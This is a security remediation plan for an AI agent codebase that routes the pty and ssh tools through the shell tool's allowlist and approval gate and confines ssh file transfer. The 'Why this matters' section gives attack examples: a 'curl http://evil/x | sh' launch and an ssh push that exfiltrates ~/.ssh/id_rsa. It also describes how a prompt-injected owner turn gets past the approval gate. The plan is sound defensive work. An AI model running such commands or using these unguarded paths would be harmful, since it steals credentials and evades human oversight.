# Plan 199: Route `pty` and `ssh` command execution through the shell gate, and confine `ssh` file transfer

> **Executor instructions**: Follow step by step. Run every verification
> command and confirm the expected result. On a "STOP condition", stop and
> report. When done, update this plan's status row in `plans/README.md`.
>
> **Drift check (run first)**:
> `git diff --stat bba8e1d..HEAD -- src/tools/pty.rs src/tools/ssh.rs src/tools/shell.rs src/security/policy.rs`

## Status

- **Priority**: P0 (security — full shell-gate bypass on owner turns)
- **Effort**: M
- **Risk**: MED
- **Depends on**: none (independent of plan 196; both harden execution)
- **Category**: security / bug
- **Planned at**: commit `bba8e1d`, 2026-08-20

## Why this matters

The `shell` tool runs every command through the full policy gate:
allowlist + risk classification + a cascading human-approval loop for
non-allowlisted basenames (`src/tools/shell.rs:311-388`). The `pty` and `ssh`
tools execute **arbitrary commands** but consult only `can_act()` +
`record_action()` — no allowlist, no risk gate, no approval prompt:

- `pty start command="curl http://evil/x | sh"` (local target) launches a raw
  command via `tmux` with no prompt.
- `ssh exec command="…"` runs any command on the remote with no prompt.

Both are owner-only (`GuestGate::OWNER_ONLY_TOOLS` lists `ssh`, `pty`), so a
guest cannot reach them — but a **prompt-injected owner turn** gets
unrestricted local/remote execution, fully bypassing the shell gate an operator
believes is in force. Both ship in the **default** build (`remote-install` is a
default feature).

Separately, `ssh` push/pull read and write **arbitrary local paths** with no
workspace / `forbidden_paths` confinement (`ssh.rs:145-168`) — `push
local_path="~/.ssh/id_rsa"` exfiltrates it; `pull` can overwrite `~/.bashrc`.
The file tools already enforce path scoping; `ssh` does not.

## Current state

### `pty` gate — `src/tools/pty.rs:346-359`

```rust
        if matches!(action, "start" | "send") && !self.security.can_act() { /* blocked */ }
        if action == "start" && !self.security.record_action() { /* rate limited */ }
        // ... then do_start launches the raw `command` via tmux, no allowlist/approval
```

### `ssh` gate — `src/tools/ssh.rs:227-246` and transfer — `:145-168`

```rust
        if !self.security.can_act() { /* blocked */ }
        if !self.security.record_action() { /* rate limited */ }
        // do_exec runs any `command` on the remote; do_transfer takes
        // local_path/remote_path verbatim, no is_path_allowed check.
```

### The pattern to reuse — `src/tools/shell.rs:305-388`

The shell tool calls `self.security.validate_command_execution(command, approved)`
in a loop, and on an allowlist miss requests a decision via
`approvals.request_decision_in(...)`, adding the approved basename with
`add_runtime_command`. This is the exact machinery `pty`/`ssh` should reuse for
their local-command path.

## The fix

The goal is: **no arbitrary command executes through `pty`/`ssh` without the
same gate `shell` applies**, and `ssh` file transfer honors path scoping.

Because a full port of the shell approval loop into two more tools is large and
risk-prone, prefer the **simplest correct** confinement, in priority order:

### Option A (preferred) — force these tools to human approval, and scope ssh transfer

1. **pty/ssh command exec → always prompt.** The cleanest confinement that does
   not duplicate the shell loop: make `pty start`/`send` and `ssh exec` require
   an interactive approval decision before running the command, using the same
   `approvals.request_decision_in(...)` call `shell.rs:346` uses (the tool
   holds a `SecurityPolicy` with `pending()`; wire an `ApprovalManager`/backend
   the same way shell does). On `Deny`, return the rejection; on approve, run
   once (do **not** add to the persistent allowlist — these are whole-command,
   not basenames).
   - Under a non-interactive backend (channels/gateway) the default is
     deny (`AutoDenyBackend`), which fails safe.
2. **ssh push/pull → path scoping.** Note `do_transfer`/`do_exec` are **static
   associated fns** (`Self::do_transfer(args, push)`) with no `self`, so
   `self.security` is not in scope there — do the check in `execute`
   (`ssh.rs:227`, which holds `self.security: Arc<SecurityPolicy>`) before it
   dispatches to `do_transfer`, or thread the policy into the static fn. Validate
   `local_path` with `is_path_allowed(local_path)` **and**
   `is_resolved_path_allowed` (after canonicalization) exactly as
   `file_read`/`file_write` do (`src/tools/file_read.rs:69,106`,
   `file_write.rs:76,111`). Reject with a clear error on a forbidden/outside
   path. This also picks up the plan-198 floor for free.

### Option B (fallback, only if wiring an approval backend into pty/ssh proves infeasible)

Gate `pty`/`ssh` command execution behind `validate_command_execution` (the
allowlist + risk layer) so a non-allowlisted or high-risk command is **hard
blocked** rather than silently run, even without a prompt. This is weaker than
Option A (no per-command human decision) but closes the "arbitrary exec with no
gate at all" hole. Still apply the ssh-transfer path scoping from A.2.

Pick Option A. Drop to Option B only if the tool cannot obtain an
`ApprovalManager` handle at execution time — and say so in the PR.

## Files

- **In scope**: `src/tools/pty.rs`, `src/tools/ssh.rs`. Read-only reference:
  `src/tools/shell.rs` (the pattern), `src/tools/file_read.rs`/`file_write.rs`
  (the path-check pattern).
- **Out of scope**: the shell tool itself, `delegate` (its unguarded sub-loop is
  the documented reason it is owner-only — separate concern), the risk verb
  lists (plan 200), the sandbox layer (plan 215).

## STOP conditions

- If `pty`/`ssh` cannot reach an `ApprovalManager`/backend at execution time
  without a signature change that ripples across the tool registry, STOP,
  implement Option B for the command path (still do A.2 for transfer), and
  report the blocker so a follow-up can wire approval properly.
- If a test asserts that `ssh push` can write outside the workspace by design,
  STOP and report — that would contradict this plan.

## Done criteria

1. `cargo fmt --all -- --check` clean.
2. `cargo clippy --all-targets -- -D warnings` clean.
3. `cargo test -p rantaiclaw --lib tools::ssh tools::pty` passes with new tests.
4. Behavioral tests:
   - `ssh` push/pull of a forbidden local path (`~/.ssh/id_rsa`, `/etc/hosts`)
     returns an error and performs no transfer.
   - Under a deny backend (simulating a channel turn), `pty start` / `ssh exec`
     of an arbitrary command does not execute (returns the deny error).
   - A legitimate within-workspace `ssh push` still succeeds (use a temp file
     under a temp workspace).

## Test plan

Mirror the existing tests in `tools/ssh.rs`/`tools/pty.rs` (they already
construct the tool with a `SecurityPolicy`). For the approval path, reuse the
test approval backend the shell tests use (search `tools/shell.rs` tests for
how they inject a decision). For transfer scoping, follow the forbidden-path
test shape in `tools/file_write.rs`.

## Risk & rollback

- **Risk**: MED — adding a prompt to `pty`/`ssh` changes their UX for owners;
  the non-interactive default (deny) is the safe direction and matches how the
  channels/gateway paths already treat unapproved tools. Path scoping on
  transfer could block an operator who genuinely transfers a host file — if
  that is a real remote-install need, document an explicit, narrow exemption
  rather than removing the check.
- **Rollback**: revert the two tool files; no schema/config/migration change.

## Maintenance note

Any new tool that executes a command string or touches a local path should
reuse `validate_command_execution` / `is_path_allowed` rather than re-deriving
its own gate — this plan closes two instances of the same "tool spawns/reads
outside the gate" class. A registry-level lint (every command-executing tool
must reference `validate_command_execution`) would prevent regressions.
